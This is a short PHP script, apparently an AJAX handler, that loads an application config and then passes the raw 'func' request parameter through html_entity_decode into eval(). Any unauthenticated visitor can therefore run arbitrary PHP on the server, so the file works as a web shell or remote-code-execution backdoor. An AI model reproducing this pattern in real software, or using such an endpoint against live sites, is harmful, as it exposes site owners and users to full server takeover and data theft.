<?php
chdir('../');
require_once('models/config.php');

$func = $_REQUEST['func'];
//echo $func;
echo '<!--Begin AJAX Body-->';
eval(html_entity_decode($func));
echo '<!--End AJAX Body-->';